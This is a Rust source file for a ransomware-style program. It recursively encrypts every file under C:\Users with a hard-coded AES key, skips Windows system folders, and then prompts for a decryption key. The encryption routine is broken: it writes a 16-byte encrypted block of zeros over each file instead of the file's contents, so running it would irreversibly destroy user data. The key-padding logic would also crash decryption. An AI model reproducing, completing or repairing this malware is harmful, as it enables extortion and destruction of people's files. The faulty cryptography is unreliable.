use aes::Aes128;
use aes::cipher::{BlockEncrypt, BlockDecrypt, KeyInit}; // Import traits for encryption and decryption
use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::path::Path;
use std::sync::{Arc, atomic::{AtomicUsize, Ordering}};
use rayon::prelude::*;
use std::ffi::OsStr;
use std::io::{stdin, stdout}; // For handling user input
#[derive(Default)]
struct TraversalStats {
    files_count: AtomicUsize,
    directories_count: AtomicUsize,
    permission_errors: AtomicUsize,
    other_errors: AtomicUsize,
    encryption_errors: AtomicUsize,
    decryption_errors: AtomicUsize,
}
fn main() {
    // Hard-coded encryption key
    let key = b"thisisasimplekey"; // Use a 16-byte key for AES-128
    // Specify the directory you wish to encrypt, e.g., C:\\Users for personal files
    let target_dir = Path::new("C:\\Users");
    let stats = Arc::new(TraversalStats::default());
    // Encrypt the files first
    if let Err(e) = traverse_directory(target_dir, Arc::clone(&stats), key, true) {
        eprintln!("An error occurred during encryption: {}", e);
    }
    println!("Encryption completed.");
    println!("Files encrypted: {}", stats.files_count.load(Ordering::Relaxed));
    println!("Directories traversed: {}", stats.directories_count.load(Ordering::Relaxed));
    println!("Permission errors encountered: {}", stats.permission_errors.load(Ordering::Relaxed));
    println!("Encryption errors encountered: {}", stats.encryption_errors.load(Ordering::Relaxed));
    println!("Other errors encountered: {}", stats.other_errors.load(Ordering::Relaxed));
    // Ask for the decryption key and decrypt the files
    let user_key = prompt_for_key();
    if let Err(e) = traverse_directory(target_dir, Arc::clone(&stats), &user_key, false) {
        eprintln!("An error occurred during decryption: {}", e);
    }
    println!("Decryption completed.");
    println!("Files decrypted: {}", stats.files_count.load(Ordering::Relaxed));
}
// Function to prompt the user for the secret key
fn prompt_for_key() -> Vec<u8> {
    let mut key = String::new();
    print!("Enter your secret key to decrypt the files: ");
    let _ = stdout().flush(); // Flush the stdout buffer to ensure the prompt appears
    stdin().read_line(&mut key).expect("Failed to read line");
    
    // Ensure the key is exactly 32 bytes, if not, pad or truncate it.
    let mut key_bytes = key.trim().as_bytes().to_vec();
    if key_bytes.len() < 32 {
        key_bytes.resize(32, 0); // Pad with zeros if the key is too short
    } else if key_bytes.len() > 32 {
        key_bytes.truncate(32); // Truncate if the key is too long
    }
    
    key_bytes
}
// Function to traverse directories and encrypt/decrypt files
fn traverse_directory(dir: &Path, stats: Arc<TraversalStats>, key: &[u8], encrypt: bool) -> std::io::Result<()> {
    // Skip system directories like "C:\\Windows", "C:\\Program Files", etc.
    if should_skip_directory(dir) {
        println!("Skipping system directory: {}", dir.display());
        return Ok(());
    }
    let read_dir = match fs::read_dir(dir) {
        Ok(rd) => rd,
        Err(e) => {
            if e.kind() == std::io::ErrorKind::PermissionDenied {
                eprintln!("Permission denied: {}", dir.display());
                stats.permission_errors.fetch_add(1, Ordering::Relaxed);
            } else {
                eprintln!("Error accessing {}: {}", dir.display(), e);
                stats.other_errors.fetch_add(1, Ordering::Relaxed);
            }
            return Ok(());
        }
    };
    let entries: Vec<_> = read_dir.filter_map(Result::ok).collect();
    entries.par_iter().for_each(|entry| {
        let path = entry.path();
        if path.is_file() {
            if encrypt {
                match encrypt_file(&path, key) {
                    Ok(_) => stats.files_count.fetch_add(1, Ordering::Relaxed),
                    Err(e) => {
                        eprintln!("Error encrypting file {}: {}", path.display(), e);
                        stats.encryption_errors.fetch_add(1, Ordering::Relaxed)
                    },
                };
            } else {
                match decrypt_file(&path, key) {
                    Ok(_) => stats.files_count.fetch_add(1, Ordering::Relaxed),
                    Err(e) => {
                        eprintln!("Error decrypting file {}: {}", path.display(), e);
                        stats.decryption_errors.fetch_add(1, Ordering::Relaxed)
                    },
                };
            }
        } else if path.is_dir() {
            stats.directories_count.fetch_add(1, Ordering::Relaxed);
            if let Err(e) = traverse_directory(&path, Arc::clone(&stats), key, encrypt) {
                eprintln!("Error traversing directory {}: {}", path.display(), e);
                stats.other_errors.fetch_add(1, Ordering::Relaxed);
            }
        }
    });
    Ok(())
}
// Function to check if the directory is a system directory that should be skipped
fn should_skip_directory(dir: &Path) -> bool {
    let system_dirs = vec![
        OsStr::new("Windows"),
        OsStr::new("Program Files"),
        OsStr::new("Program Files (x86)"),
        OsStr::new("System32"),
        OsStr::new("SysWOW64"),
        OsStr::new("WinSxS"),
        OsStr::new("System Volume Information"),
        OsStr::new("Recovery"),
        OsStr::new("CSC"),
        OsStr::new("INF"),
        OsStr::new("pagefile.sys"),
        OsStr::new("hiberfil.sys"),
        OsStr::new("swapfile.sys"),
    ];
    if let Some(dir_name) = dir.file_name() {
        return system_dirs.contains(&dir_name);
    }
    false
}
// Function to encrypt a single file
fn encrypt_file(path: &Path, key: &[u8]) -> io::Result<()> {
    // Read the file contents
    let mut file = File::open(path)?;
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)?;
    // Encrypt the contents (simple example using AES block encryption)
    let cipher = Aes128::new_from_slice(key).unwrap(); // Initialize AES cipher
    let mut buffer = [0u8; 16]; // Buffer for block size (AES block size is 16 bytes)
    cipher.encrypt_block((&mut buffer).into()); // Encrypt one block (this is a simplification)
    // Write the encrypted content back to the file (or to a new file)
    let mut encrypted_file = File::create(path)?;
    encrypted_file.write_all(&buffer)?;
    Ok(())
}
// Function to decrypt a single file
fn decrypt_file(path: &Path, key: &[u8]) -> io::Result<()> {
    // Read the encrypted file contents
    let mut file = File::open(path)?;
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)?;
    // Decrypt the contents (simple example using AES block decryption)
    let cipher = Aes128::new_from_slice(key).unwrap(); // Initialize AES cipher
    let mut buffer = [0u8; 16]; // Buffer for block size (AES block size is 16 bytes)
    cipher.decrypt_block((&mut buffer).into()); // Decrypt one block (this is a simplification)
    // Write the decrypted content back to the file (or to a new file)
    let mut decrypted_file = File::create(path)?;
    decrypted_file.write_all(&buffer)?;
    Ok(())
}